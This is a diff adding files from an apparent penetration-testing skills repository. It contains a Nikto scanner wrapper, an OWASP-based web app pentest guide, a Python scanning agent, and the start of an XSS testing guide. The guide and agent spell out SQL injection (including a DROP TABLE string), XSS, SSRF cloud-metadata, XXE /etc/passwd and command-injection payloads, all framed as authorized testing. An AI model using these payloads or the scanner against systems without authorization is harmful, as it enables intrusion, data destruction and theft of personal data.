@@ -1,0 +1,981 @@
+[PART 5/14]
+-----
+    scan_p.add_argument("--report", default=None, help="HTML report output path")
+    scan_p.add_argument("--tuning", default="123456789abc", help="Nikto tuning options")
+    scan_p.add_argument("--parallel", type=int, default=3, help="Max parallel scans")
+    scan_p.add_argument("--timeout", type=int, default=600, help="Per-target timeout")
+    scan_p.add_argument("--pause", type=int, default=1, help="Pause between requests")
+
+    parse_p = subparsers.add_parser("parse", help="Parse existing Nikto XML results")
+    parse_p.add_argument("--xml-dir", required=True, help="Directory with Nikto XML files")
+    parse_p.add_argument("--report", required=True, help="HTML report output path")
+
+    args = parser.parse_args()
+
+    if args.command == "scan":
+        with open(args.targets) as f:
+            targets = [line.strip() for line in f if line.strip() and not line.startswith("#")]
+
+        scanner = NiktoScanner(args.output_dir, args.timeout)
+        scanner.scan_targets(targets, max_parallel=args.parallel,
+                             tuning=args.tuning, pause=args.pause)
+
+        report_path = args.report or os.path.join(args.output_dir, "nikto_report.html")
+        scanner.generate_report(report_path)
+
+    elif args.command == "parse":
+        scanner = NiktoScanner()
+        xml_dir = Path(args.xml_dir)
+
+        for xml_file in xml_dir.glob("*.xml"):
+            findings = scanner.parse_xml(str(xml_file))
+            scanner.results.append({
+                "target": xml_file.stem,
+                "status": "parsed",
+                "findings": findings,
+            })
+
+        scanner.generate_report(args.report)
+
+    else:
+        parser.print_help()
+
+
+if __name__ == "__main__":
+    main()
+
+##### END FILE #####
+
+##### FILE: performing-web-application-penetration-test/SKILL.md #####
+---
+name: performing-web-application-penetration-test
+description: 'Performs systematic security testing of web applications following the
+  OWASP Web Security Testing Guide (WSTG) methodology to identify vulnerabilities
+  in authentication, authorization, input validation, session management, and business
+  logic. The tester uses Burp Suite as the primary interception proxy alongside manual
+  testing techniques to find flaws that automated scanners miss. Activates for requests
+  involving web app pentest, OWASP testing, application security assessment, or web
+  vulnerability testing.
+
+  '
+domain: cybersecurity
+subdomain: penetration-testing
+tags:
+- web-application-pentest
+- OWASP
+- Burp-Suite
+- WSTG
+- application-security
+version: 1.0.0
+author: mahipal
+license: Apache-2.0
+nist_csf:
+- ID.RA-01
+- ID.RA-06
+- GV.OV-02
+- DE.AE-07
+mitre_attack:
+- T1595
+- T1190
+- T1059
+- T1078
+---
+# Performing Web Application Penetration Test
+
+## When to Use
+
+- Testing web applications before production deployment to identify exploitable vulnerabilities
+- Conducting compliance-driven security assessments (PCI-DSS requirement 6.6, SOC 2 Type II)
+- Validating remediation of previously identified web application vulnerabilities during retesting
+- Assessing third-party web applications before integration into the organization's environment
+- Evaluating custom-developed web applications where automated scanning alone is insufficient
+
+**Do not use** against web applications without written authorization, against production systems during peak traffic hours without explicit approval, or for denial-of-service testing of web infrastructure.
+
+## Prerequisites
+
+- Signed statement of work (SoW) defining the target application URLs, environments (staging/production), and testing boundaries
+- Burp Suite Professional license with up-to-date extensions (Active Scan++, Autorize, JSON Beautifier, Logger++)
+- Valid test accounts at each privilege level (unauthenticated, standard user, administrator) for authorization testing
+- Application documentation including API specifications (OpenAPI/Swagger), sitemap, and technology stack details
+- Browser configured with Burp Suite proxy (FoxyProxy recommended) and Burp CA certificate installed
+
+## Workflow
+
+### Step 1: Reconnaissance and Application Mapping
+
+Map the entire attack surface of the web application:
+
+- Configure Burp Suite proxy and spider the application by browsing every page, form, and function manually while Burp captures the sitemap
+- Use Burp's Discover Content feature to find hidden directories and files not linked from the visible application
+- Identify the technology stack from response headers (`X-Powered-By`, `Server`), cookies (JSESSIONID = Java, PHPSESSID = PHP, ASP.NET_SessionId = .NET), and page extensions
+- Enumerate endpoints using `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://target.com/FUZZ -mc 200,301,302,403`
+- Review JavaScript files for hardcoded API endpoints, secrets, and client-side routing using Burp's JS Link Finder extension or `LinkFinder.py`
+- Document all entry points: URL parameters, POST bodies, HTTP headers, cookies, file uploads, and WebSocket connections
+
+### Step 2: Authentication Testing
+
+Test authentication mechanisms for weaknesses:
+
+- **Credential enumeration**: Submit valid and invalid usernames to identify differences in response (timing, message, HTTP status) that reveal valid accounts
+- **Brute force protection**: Attempt 10-20 rapid login attempts with invalid credentials to verify account lockout and rate limiting are enforced
+- **Password policy**: Test password creation with weak passwords (123456, password, single character) to verify policy enforcement
+- **Multi-factor authentication bypass**: Test for MFA bypass by directly accessing post-authentication pages, manipulating MFA tokens, or replaying successful MFA responses
+- **Session fixation**: Note the session token before and after authentication. If the token does not change after login, session fixation is possible
+- **Remember me functionality**: Inspect persistent authentication tokens for predictability, encryption, and proper expiration
+- **Password reset**: Test the password reset flow for token predictability, token expiration, account enumeration via the reset form, and host header injection
+
+### Step 3: Authorization Testing
+
+Verify that access controls are properly enforced:
+
+- **Horizontal privilege escalation (IDOR)**: Using Account A, capture requests that access Account A's resources. Replay those requests substituting Account B's identifiers (user IDs, order numbers, filenames). Use Burp's Autorize extension to automate this across all endpoints.
+- **Vertical privilege escalation**: Using a low-privilege account, attempt to access administrative functions by directly browsing to admin URLs, modifying role parameters in requests, or manipulating JWT claims
+- **Forced browsing**: Attempt to access resources that should require authentication by directly navigating to internal URLs collected during mapping
+- **HTTP method tampering**: If GET is blocked on an endpoint, try PUT, POST, DELETE, PATCH, or use method override headers (`X-HTTP-Method-Override: DELETE`)
+- **Path traversal in authorization**: Test URL path manipulation (`/api/users/123/../456/profile`) to bypass path-based authorization checks
+
+### Step 4: Input Validation and Injection Testing
+
+Test all input points for injection vulnerabilities:
+
+- **SQL injection**: Insert payloads like `' OR 1=1--`, `' UNION SELECT NULL,NULL--`, and time-based blind payloads (`'; WAITFOR DELAY '0:0:5'--`) into every parameter. Use sqlmap for automated detection and exploitation of confirmed injection points.
+- **Cross-Site Scripting (XSS)**: Test reflected, stored, and DOM-based XSS with payloads like `<script>alert(document.domain)</script>`, `"><img src=x onerror=alert(1)>`, and event handlers. Test in all contexts: HTML body, attributes, JavaScript, and URLs.
+- **Server-Side Request Forgery (SSRF)**: Supply internal URLs (`http://169.254.169.254/latest/meta-data/`, `http://127.0.0.1:6379/`) in parameters that fetch external resources (webhooks, image URLs, import functions)
+- **Command injection**: Insert OS command separators (`;`, `|`, `&&`, `` ` ``) followed by commands (`id`, `whoami`, `ping -c 3 collaborator.net`) in parameters processed by the server
+- **XML External Entity (XXE)**: Submit XML payloads with external entity declarations (`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`) in XML upload or API endpoints
+- **Server-Side Template Injection (SSTI)**: Test with `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` in parameters rendered by template engines
+
+### Step 5: Session Management Testing
+
+Evaluate the security of session handling:
+
+- **Session token analysis**: Collect 100+ session tokens and analyze for randomness using Burp Sequencer. Check token length (minimum 128 bits of entropy), character set, and predictability.
+- **Session expiration**: Verify that sessions expire after a defined idle timeout and absolute timeout. Test by capturing a session token, waiting beyond the timeout, and replaying.
+- **Cookie security flags**: Verify `Secure`, `HttpOnly`, and `SameSite` flags are set on session cookies. Missing `HttpOnly` enables XSS-based session theft. Missing `SameSite` enables CSRF.
+- **CSRF testing**: Identify state-changing operations (password change, email update, fund transfer) and test if they can be triggered from a cross-origin page without a valid CSRF token
+- **Concurrent session handling**: Test if the application limits the number of concurrent sessions and if logging in from a new location invalidates the previous session
+
+### Step 6: Business Logic Testing
+
+Test application-specific logic flaws that automated scanners cannot detect:
+
+- **Race conditions**: Send multiple simultaneous requests to exploit time-of-check-to-time-of-use (TOCTOU) vulnerabilities (double-spending, coupon reuse, voting multiple times) using Burp Turbo Intruder
+- **Workflow bypass**: Attempt to skip steps in multi-step processes (checkout, registration, approval) by directly requesting later-stage endpoints
+- **Numeric manipulation**: Modify prices, quantities, or amounts to negative values, zero, or extremely large numbers to test for integer overflow or logic errors
+- **File upload bypass**: Test file upload restrictions by modifying MIME types, double extensions (file.php.jpg), null bytes (file.php%00.jpg), and content-type manipulation
+
+### Step 7: Report and Remediation Guidance
+
+Compile all findings into a structured report:
+
+- Write an executive summary describing the overall application security posture in business terms
+- Document each finding with title, severity (CVSS 3.1), affected URL/parameter, description, reproduction steps, screenshots, and HTTP request/response pairs from Burp
+- Provide specific remediation guidance for each finding including code-level fixes where applicable
+- Include a risk matrix showing the distribution of findings by severity
+- Deliver the report securely (encrypted, not via email attachment) and schedule a findings walkthrough with the development team
+
+## Key Concepts
+
+| Term | Definition |
+|------|------------|
+| **OWASP WSTG** | The Web Security Testing Guide; a comprehensive open-source guide to testing web application security organized by test category (authentication, authorization, input validation, etc.) |
+| **IDOR** | Insecure Direct Object Reference; a vulnerability where the application exposes internal object identifiers and fails to verify the requesting user is authorized to access that object |
+| **CSRF** | Cross-Site Request Forgery; an attack that forces an authenticated user's browser to send a forged request to a vulnerable web application |
+| **Session Fixation** | An attack where the attacker sets a user's session ID to a known value before the user authenticates, then hijacks the session after login |
+| **Forced Browsing** | Attempting to access application resources by directly requesting URLs not linked from the visible application, bypassing intended access controls |
+| **SSTI** | Server-Side Template Injection; injecting template directives into server-side template engines to achieve remote code execution |
+
+## Tools & Systems
+
+- **Burp Suite Professional**: Primary web application testing proxy providing interception, scanning, and manual testing tools including Repeater, Intruder, and Sequencer
+- **ffuf**: Fast web fuzzer for directory/file discovery, parameter fuzzing, and virtual host enumeration
+- **sqlmap**: Automated SQL injection detection and exploitation tool supporting all major database engines and injection techniques
+- **Nuclei**: Template-based vulnerability scanner with community-maintained templates for known CVEs and misconfigurations
+- **SecLists**: Curated collection of wordlists for fuzzing, credential testing, and payload delivery used throughout web application testing
+
+## Common Scenarios
+
+### Scenario: E-Commerce Application Pre-Launch Security Assessment
+
+**Context**: A retail company is launching a new e-commerce platform built on Node.js with a React frontend and PostgreSQL database. The application handles credit card payments through Stripe integration and stores customer PII. Testing scope includes the staging environment with full API access.
+
+**Approach**:
+1. Map the application through manual browsing and API documentation review, identifying 47 unique endpoints
+2. Test authentication flows including social login (OAuth), standard login, and password reset
+3. Discover IDOR vulnerability in the order retrieval API (`/api/orders/{orderId}`) where any authenticated user can view any order by iterating order IDs
+4. Identify stored XSS in the product review feature that executes when administrators view the admin dashboard
+5. Find SSRF in the product image import function that allows reading AWS EC2 instance metadata
+6. Test payment logic by manipulating price values in the client-side cart before checkout submission
+7. Report all findings with specific Node.js code-level remediation (parameterized queries, input sanitization with DOMPurify, authorization middleware)
+
+**Pitfalls**:
+- Testing only the frontend while ignoring the API layer that lacks independent authorization checks
+- Missing business logic flaws by relying solely on automated scanning without manual testing
+- Not testing the same functionality across different privilege levels to catch authorization issues
+- Overlooking client-side JavaScript for hardcoded API keys, debug endpoints, and internal URLs
+
+## Output Format
+
+```
+## Finding: Insecure Direct Object Reference in Order API
+
+**ID**: WEB-003
+**Severity**: High (CVSS 7.5)
+**Affected URL**: GET /api/v1/orders/{orderId}
+**Parameter**: orderId (path parameter)
+
+**Description**:
+The order retrieval endpoint does not verify that the authenticated user owns
+the requested order. Any authenticated user can access any order's details
+including customer name, shipping address, email, phone number, and order
+items by incrementing the orderId path parameter.
+
+**Reproduction Steps**:
+1. Authenticate as user A (testuser@example.com)
+2. Note user A's order ID: 10451
+3. Send GET /api/v1/orders/10452 with user A's session token
+4. Observe that user B's order details are returned with full PII
+
+**HTTP Request**:
+GET /api/v1/orders/10452 HTTP/1.1
+Host: staging.example.com
+Authorization: Bearer eyJhbGc....[User A's token]
+
+**HTTP Response** (truncated):
+HTTP/1.1 200 OK
+{"orderId":10452,"customerName":"Jane Smith","email":"jane@...","address":"123 Main St"}
+
+**Impact**:
+An attacker can enumerate all customer orders and extract PII (names, emails,
+addresses, phone numbers) for an estimated 25,000 customers.
+
+**Remediation**:
+Add authorization middleware that verifies the authenticated user's ID matches
+the order's userId field before returning order data. Implement UUIDs instead
+of sequential integers for order identifiers to prevent enumeration.
+```
+
+##### END FILE #####
+
+##### FILE: performing-web-application-penetration-test/LICENSE #####
+
+                                 Apache License
+                           Version 2.0, January 2004
+                        http://www.apache.org/licenses/
+
+   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION
+
+   1. Definitions.
+
+      "License" shall mean the terms and conditions for use, reproduction,
+      and distribution as defined by Sections 1 through 9 of this document.
+
+      "Licensor" shall mean the copyright owner or entity authorized by
+      the copyright owner that is granting the License.
+
+      "Legal Entity" shall mean the union of the acting entity and all
+      other entities that control, are controlled by, or are under common
+      control with that entity. For the purposes of this definition,
+      "control" means (i) the power, direct or indirect, to cause the
+      direction or management of such entity, whether by contract or
+      otherwise, or (ii) ownership of fifty percent (50%) or more of the
+      outstanding shares, or (iii) beneficial ownership of such entity.
+
+      "You" (or "Your") shall mean an individual or Legal Entity
+      exercising permissions granted by this License.
+
+      "Source" form shall mean the preferred form for making modifications,
+      including but not limited to software source code, documentation
+      source, and configuration files.
+
+      "Object" form shall mean any form resulting from mechanical
+      transformation or translation of a Source form, including but
+      not limited to compiled object code, generated documentation,
+      and conversions to other media types.
+
+      "Work" shall mean the work of authorship, whether in Source or
+      Object form, made available under the License, as indicated by a
+      copyright notice that is included in or attached to the work
+      (an example is provided in the Appendix below).
+
+      "Derivative Works" shall mean any work, whether in Source or Object
+      form, that is based on (or derived from) the Work and for which the
+      editorial revisions, annotations, elaborations, or other modifications
+      represent, as a whole, an original work of authorship. For the purposes
+      of this License, Derivative Works shall not include works that remain
+      separable from, or merely link (or bind by name) to the interfaces of,
+      the Work and Derivative Works thereof.
+
+      "Contribution" shall mean any work of authorship, including
+      the original version of the Work and any modifications or additions
+      to that Work or Derivative Works thereof, that is intentionally
+      submitted to the Licensor for inclusion in the Work by the copyright owner
+      or by an individual or Legal Entity authorized to submit on behalf of
+      the copyright owner. For the purposes of this definition, "submitted"
+      means any form of electronic, verbal, or written communication sent
+      to the Licensor or its representatives, including but not limited to
+      communication on electronic mailing lists, source code control systems,
+      and issue tracking systems that are managed by, or on behalf of, the
+      Licensor for the purpose of discussing and improving the Work, but
+      excluding communication that is conspicuously marked or otherwise
+      designated in writing by the copyright owner as "Not a Contribution."
+
+      "Contributor" shall mean Licensor and any individual or Legal Entity
+      on behalf of whom a Contribution has been received by the Licensor and
+      subsequently incorporated within the Work.
+
+   2. Grant of Copyright License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      copyright license to reproduce, prepare Derivative Works of,
+      publicly display, publicly perform, sublicense, and distribute the
+      Work and such Derivative Works in Source or Object form.
+
+   3. Grant of Patent License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      (except as stated in this section) patent license to make, have made,
+      use, offer to sell, sell, import, and otherwise transfer the Work,
+      where such license applies only to those patent claims licensable
+      by such Contributor that are necessarily infringed by their
+      Contribution(s) alone or by combination of their Contribution(s)
+      with the Work to which such Contribution(s) was submitted. If You
+      institute patent litigation against any entity (including a
+      cross-claim or counterclaim in a lawsuit) alleging that the Work
+      or a Contribution incorporated within the Work constitutes direct
+      or contributory patent infringement, then any patent licenses
+      granted to You under this License for that Work shall terminate
+      as of the date such litigation is filed.
+
+   4. Redistribution. You may reproduce and distribute copies of the
+      Work or Derivative Works thereof in any medium, with or without
+      modifications, and in Source or Object form, provided that You
+      meet the following conditions:
+
+      (a) You must give any other recipients of the Work or
+          Derivative Works a copy of this License; and
+
+      (b) You must cause any modified files to carry prominent notices
+          stating that You changed the files; and
+
+      (c) You must retain, in the Source form of any Derivative Works
+          that You distribute, all copyright, patent, trademark, and
+          attribution notices from the Source form of the Work,
+          excluding those notices that do not pertain to any part of
+          the Derivative Works; and
+
+      (d) If the Work includes a "NOTICE" text file as part of its
+          distribution, then any Derivative Works that You distribute must
+          include a readable copy of the attribution notices contained
+          within such NOTICE file, excluding any notices that do not
+          pertain to any part of the Derivative Works, in at least one
+          of the following places: within a NOTICE text file distributed
+          as part of the Derivative Works; within the Source form or
+          documentation, if provided along with the Derivative Works; or,
+          within a display generated by the Derivative Works, if and
+          wherever such third-party notices normally appear. The contents
+          of the NOTICE file are for informational purposes only and
+          do not modify the License. You may add Your own attribution
+          notices within Derivative Works that You distribute, alongside
+          or as an addendum to the NOTICE text from the Work, provided
+          that such additional attribution notices cannot be construed
+          as modifying the License.
+
+      You may add Your own copyright statement to Your modifications and
+      may provide additional or different license terms and conditions
+      for use, reproduction, or distribution of Your modifications, or
+      for any such Derivative Works as a whole, provided Your use,
+      reproduction, and distribution of the Work otherwise complies with
+      the conditions stated in this License.
+
+   5. Submission of Contributions. Unless You explicitly state otherwise,
+      any Contribution intentionally submitted for inclusion in the Work
+      by You to the Licensor shall be under the terms and conditions of
+      this License, without any additional terms or conditions.
+      Notwithstanding the above, nothing herein shall supersede or modify
+      the terms of any separate license agreement you may have executed
+      with Licensor regarding such Contributions.
+
+   6. Trademarks. This License does not grant permission to use the trade
+      names, trademarks, service marks, or product names of the Licensor,
+      except as required for reasonable and customary use in describing the
+      origin of the Work and reproducing the content of the NOTICE file.
+
+   7. Disclaimer of Warranty. Unless required by applicable law or
+      agreed to in writing, Licensor provides the Work (and each
+      Contributor provides its Contributions) on an "AS IS" BASIS,
+      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
+      implied, including, without limitation, any warranties or conditions
+      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
+      PARTICULAR PURPOSE. You are solely responsible for determining the
+      appropriateness of using or redistributing the Work and assume any
+      risks associated with Your exercise of permissions under this License.
+
+   8. Limitation of Liability. In no event and under no legal theory,
+      whether in tort (including negligence), contract, or otherwise,
+      unless required by applicable law (such as deliberate and grossly
+      negligent acts) or agreed to in writing, shall any Contributor be
+      liable to You for damages, including any direct, indirect, special,
+      incidental, or consequential damages of any character arising as a
+      result of this License or out of the use or inability to use the
+      Work (including but not limited to damages for loss of goodwill,
+      work stoppage, computer failure or malfunction, or any and all
+      other commercial damages or losses), even if such Contributor
+      has been advised of the possibility of such damages.
+
+   9. Accepting Warranty or Additional Liability. While redistributing
+      the Work or Derivative Works thereof, You may choose to offer,
+      and charge a fee for, acceptance of support, warranty, indemnity,
+      or other liability obligations and/or rights consistent with this
+      License. However, in accepting such obligations, You may act only
+      on Your own behalf and on Your sole responsibility, not on behalf
+      of any other Contributor, and only if You agree to indemnify,
+      defend, and hold each Contributor harmless for any liability
+      incurred by, or claims asserted against, such Contributor by reason
+      of your accepting any such warranty or additional liability.
+
+   END OF TERMS AND CONDITIONS
+
+   APPENDIX: How to apply the Apache License to your work.
+
+      To apply the Apache License to your work, attach the following
+      boilerplate notice, with the fields enclosed by brackets "[]"
+      replaced with your own identifying information. (Don't include
+      the brackets!)  The text should be enclosed in the appropriate
+      comment syntax for the file format. Please do not remove or change
+      the license header comment from a contributed file except when
+      necessary.
+
+   Copyright 2026 mukul975
+
+   Licensed under the Apache License, Version 2.0 (the "License");
+   you may not use this file except in compliance with the License.
+   You may obtain a copy of the License at
+
+       http://www.apache.org/licenses/LICENSE-2.0
+
+   Unless required by applicable law or agreed to in writing, software
+   distributed under the License is distributed on an "AS IS" BASIS,
+   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+   See the License for the specific language governing permissions and
+   limitations under the License.
+
+##### END FILE #####
+
+##### FILE: performing-web-application-penetration-test/references/api-reference.md #####
+# API Reference: Web Application Penetration Test Agent
+
+## Overview
+
+Performs automated web application security testing: technology fingerprinting, security header checks, HTTP method testing, CORS misconfiguration detection, basic SQL injection, and reflected XSS testing.
+
+## Dependencies
+
+| Package | Version | Purpose |
+|---------|---------|---------|
+| requests | >= 2.28 | HTTP client for all web tests |
+
+## External Tools (Optional)
+
+| Tool | Purpose |
+|------|---------|
+| ffuf | Directory and file brute-forcing |
+
+## Core Functions
+
+### `fingerprint_technology(target_url)`
+Identifies server, framework, and language from headers and cookie names.
+- **Returns**: `dict` with `server` and `technologies` list
+
+### `check_security_headers(target_url)`
+Checks HSTS, CSP, X-Content-Type-Options, X-Frame-Options, X-XSS-Protection, Referrer-Policy, Permissions-Policy.
+- **Returns**: `dict[str, dict]` - header to presence/value mapping
+
+### `test_http_methods(target_url)`
+Tests for dangerous HTTP methods (PUT, DELETE, TRACE, CONNECT).
+- **Returns**: `list[dict]` - allowed dangerous methods with risk levels
+
+### `test_cors_config(target_url)`
+Tests CORS with evil origins, null origin, and subdomain spoofing.
+- **Returns**: `list[dict]` - reflected origins with credential risks
+
+### `run_directory_bruteforce(target_url, wordlist)`
+Subprocess wrapper for ffuf directory enumeration.
+- **Default wordlist**: `/usr/share/seclists/Discovery/Web-Content/common.txt`
+
+### `test_sql_injection_basic(target_url, params)`
+Tests URL parameters with SQL injection payloads and checks for database error strings.
+- **Risk**: CRITICAL when SQL error patterns detected
+
+### `test_xss_basic(target_url, params)`
+Tests for reflected XSS by checking if payloads appear unescaped in response body.
+- **Risk**: HIGH when payload is reflected
+
+### `run_assessment(target_url, test_params)`
+Full assessment pipeline with summary statistics.
+
+## OWASP Test Coverage
+
+| OWASP Category | Tests Performed |
+|----------------|----------------|
+| A01 Broken Access Control | CORS, HTTP methods |
+| A03 Injection | SQL injection, XSS |
+| A05 Security Misconfiguration | Security headers, HTTP methods |
+
+## Usage
+
+```bash
+python agent.py https://target-app.example.com
+```
+
+##### END FILE #####
+
+##### FILE: performing-web-application-penetration-test/scripts/agent.py #####
+#!/usr/bin/env python3
+"""Web application penetration test agent using requests and subprocess."""
+
+import subprocess
+import sys
+import json
+import os
+from urllib.parse import urlparse
+
+try:
+    import requests
+    from requests.exceptions import RequestException
+except ImportError:
+    print("Install: pip install requests")
+    sys.exit(1)
+
+
+def fingerprint_technology(target_url):
+    """Identify technology stack from response headers and cookies."""
+    try:
+        resp = requests.get(target_url, timeout=10, verify=False, allow_redirects=True)
+    except RequestException as e:
+        return {"error": str(e)}
+    headers = dict(resp.headers)
+    tech = {"server": headers.get("Server", "Unknown"), "technologies": []}
+    if "X-Powered-By" in headers:
+        tech["technologies"].append(headers["X-Powered-By"])
+    cookies = resp.cookies.get_dict()
+    cookie_tech = {
+        "JSESSIONID": "Java", "PHPSESSID": "PHP",
+        "ASP.NET_SessionId": "ASP.NET", "csrftoken": "Django",
+        "laravel_session": "Laravel", "_rails_session": "Ruby on Rails",
+    }
+    for cookie_name, framework in cookie_tech.items():
+        if cookie_name in cookies:
+            tech["technologies"].append(framework)
+    return tech
+
+
+def check_security_headers(target_url):
+    """Check for presence of security headers."""
+    try:
+        resp = requests.get(target_url, timeout=10, verify=False)
+    except RequestException as e:
+        return {"error": str(e)}
+    required_headers = {
+        "Strict-Transport-Security": "HSTS",
+        "Content-Security-Policy": "CSP",
+        "X-Content-Type-Options": "nosniff",
+        "X-Frame-Options": "Clickjacking protection",
+        "X-XSS-Protection": "XSS filter",
+        "Referrer-Policy": "Referrer control",
+        "Permissions-Policy": "Feature policy",
+    }
+    results = {}
+    for header, desc in required_headers.items():
+        value = resp.headers.get(header)
+        results[header] = {
+            "present": value is not None,
+            "value": value,
+            "description": desc,
+        }
+    return results
+
+
+def test_http_methods(target_url):
+    """Test for dangerous HTTP methods."""
+    dangerous = ["PUT", "DELETE", "TRACE", "CONNECT"]
+    results = []
+    for method in dangerous:
+        try:
+            resp = requests.request(method, target_url, timeout=5, verify=False)
+            if resp.status_code not in (405, 501):
+                results.append({
+                    "method": method, "status": resp.status_code,
+                    "risk": "HIGH" if method in ("PUT", "DELETE") else "MEDIUM",
+                })
+        except RequestException:
+            pass
+    try:
+        resp = requests.options(target_url, timeout=5, verify=False)
+        allow = resp.headers.get("Allow", "")
+        results.append({"method": "OPTIONS", "allow_header": allow})
+    except RequestException:
+        pass
+    return results
+
+
+def test_cors_config(target_url):
+    """Test CORS configuration for misconfigurations."""
+    tests = []
+    origins = [
+        "https://evil.com",
+        "null",
+        urlparse(target_url).scheme + "://" + urlparse(target_url).hostname + ".evil.com",
+    ]
+    for origin in origins:
+        try:
+            resp = requests.get(
+                target_url, headers={"Origin": origin},
+                timeout=5, verify=False
+            )
+            acao = resp.headers.get("Access-Control-Allow-Origin", "")
+            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
+            if acao == origin or acao == "*":
+                tests.append({
+                    "origin": origin, "reflected": True,
+                    "allow_credentials": acac.lower() == "true",
+                    "risk": "HIGH" if acac.lower() == "true" else "MEDIUM",
+                })
+        except RequestException:
+            pass
+    return tests
+
+
+def run_directory_bruteforce(target_url, wordlist=None):
+    """Run directory enumeration using ffuf if available."""
+    if wordlist is None:
+        wordlist = "/usr/share/seclists/Discovery/Web-Content/common.txt"
+    if not os.path.exists(wordlist):
+        return {"error": f"Wordlist not found: {wordlist}"}
+    try:
+        result = subprocess.run(
+            ["ffuf", "-w", wordlist, "-u", f"{target_url}/FUZZ",
+             "-mc", "200,301,302,403", "-t", "20", "-o", "/tmp/ffuf_output.json",
+             "-of", "json", "-s"],
+            capture_output=True, text=True, timeout=120
+        )
+        if os.path.exists("/tmp/ffuf_output.json"):
+            with open("/tmp/ffuf_output.json") as f:
+                return json.load(f)
+        return {"stdout": result.stdout[:1000]}
+    except FileNotFoundError:
+        return {"error": "ffuf not installed"}
+    except subprocess.TimeoutExpired:
+        return {"error": "ffuf timeout"}
+
+
+def test_sql_injection_basic(target_url, params):
+    """Test for basic SQL injection indicators."""
+    payloads = ["'", "' OR '1'='1", "1 OR 1=1--", "'; DROP TABLE--"]
+    sql_errors = [
+        "sql syntax", "mysql", "sqlite", "postgresql", "ora-",
+        "microsoft ole db", "unclosed quotation", "syntax error",
+    ]
+    findings = []
+    for param_name in params:
+        for payload in payloads:
+            test_params = {param_name: payload}
+            try:
+                resp = requests.get(target_url, params=test_params, timeout=10, verify=False)
+                body_lower = resp.text.lower()
+                for err in sql_errors:
+                    if err in body_lower:
+                        findings.append({
+                            "parameter": param_name, "payload": payload,
+                            "error_pattern": err, "status": resp.status_code,
+                            "risk": "CRITICAL",
+                        })
+                        break
+            except RequestException:
+                pass
+    return findings
+
+
+def test_xss_basic(target_url, params):
+    """Test for basic reflected XSS."""
+    payloads = [
+        '<script>alert(1)</script>',
+        '"><img src=x onerror=alert(1)>',
+        "'-alert(1)-'",
+    ]
+    findings = []
+    for param_name in params:
+        for payload in payloads:
+            try:
+                resp = requests.get(
+                    target_url, params={param_name: payload},
+                    timeout=10, verify=False
+                )
+                if payload in resp.text:
+                    findings.append({
+                        "parameter": param_name, "payload": payload,
+                        "reflected": True, "risk": "HIGH",
+                    })
+            except RequestException:
+                pass
+    return findings
+
+
+def run_assessment(target_url, test_params=None):
+    """Run web application security assessment."""
+    if test_params is None:
+        test_params = ["id", "q", "search", "page", "user"]
+    report = {
+        "target": target_url,
+        "technology": fingerprint_technology(target_url),
+        "security_headers": check_security_headers(target_url),
+        "http_methods": test_http_methods(target_url),
+        "cors": test_cors_config(target_url),
+        "sqli_findings": test_sql_injection_basic(target_url, test_params),
+        "xss_findings": test_xss_basic(target_url, test_params),
+    }
+    missing_headers = [
+        h for h, v in report["security_headers"].items()
+        if isinstance(v, dict) and not v.get("present", True)
+    ]
+    report["summary"] = {
+        "missing_security_headers": len(missing_headers),
+        "dangerous_methods": len(report["http_methods"]),
+        "cors_issues": len(report["cors"]),
+        "sqli_findings": len(report["sqli_findings"]),
+        "xss_findings": len(report["xss_findings"]),
+    }
+    return report
+
+
+def print_report(report):
+    print("Web Application Penetration Test Report")
+    print("=" * 50)
+    print(f"Target: {report['target']}")
+    tech = report["technology"]
+    print(f"Server: {tech.get('server', 'Unknown')}")
+    if tech.get("technologies"):
+        print(f"Stack: {', '.join(tech['technologies'])}")
+    print("\nSecurity Headers:")
+    for h, v in report["security_headers"].items():
+        if isinstance(v, dict):
+            status = "PRESENT" if v.get("present") else "MISSING"
+            print(f"  {h}: {status}")
+    if report["sqli_findings"]:
+        print(f"\nSQL Injection: {len(report['sqli_findings'])} finding(s)")
+        for f in report["sqli_findings"]:
+            print(f"  [{f['risk']}] {f['parameter']}: {f['error_pattern']}")
+    if report["xss_findings"]:
+        print(f"\nXSS: {len(report['xss_findings'])} finding(s)")
+        for f in report["xss_findings"]:
+            print(f"  [{f['risk']}] {f['parameter']}: reflected")
+
+
+if __name__ == "__main__":
+    target = sys.argv[1] if len(sys.argv) > 1 else "http://example.com"
+    result = run_assessment(target)
+    print_report(result)
+
+##### END FILE #####
+
+##### FILE: testing-for-xss-vulnerabilities/SKILL.md #####
+---
+name: testing-for-xss-vulnerabilities
+description: Tests web applications for reflected, stored, and DOM-based Cross-Site
+  Scripting by injecting JavaScript payloads with Burp Suite (XSS extensions, Active
+  Scan++) and browser tools, then bypassing sanitization and CSP to demonstrate session
+  hijacking and user impersonation. Use for OWASP WSTG client-side injection testing or
+  when evaluating input sanitization and output encoding coverage.
+domain: cybersecurity
+subdomain: penetration-testing
+tags:
+- XSS
+- cross-site-scripting
+- client-side-security
+- OWASP-A03
+- JavaScript-injection
+version: 1.0.0
+author: mahipal
+license: Apache-2.0
+nist_csf:
+- ID.RA-01
+- ID.RA-06
+- GV.OV-02
+- DE.AE-07
+mitre_attack:
+- T1595
+- T1190
+- T1059
+- T1078
+- T1055
+---
+# Testing for XSS Vulnerabilities
+
+## When to Use
+
+- Testing web applications for client-side injection vulnerabilities as part of OWASP WSTG testing
+- Evaluating the effectiveness of input sanitization and output encoding across all application features
+- Assessing the protection provided by Content Security Policy (CSP) headers against XSS exploitation
+- Demonstrating the impact of XSS through session hijacking, credential theft, or phishing overlay to stakeholders
+- Testing single-page applications (React, Angular, Vue) for DOM-based XSS in client-side routing and rendering
+
+**Do not use** against applications without written authorization, for deploying persistent XSS payloads that affect real users, or for exfiltrating actual user session tokens from production environments.
+
+## Prerequisites
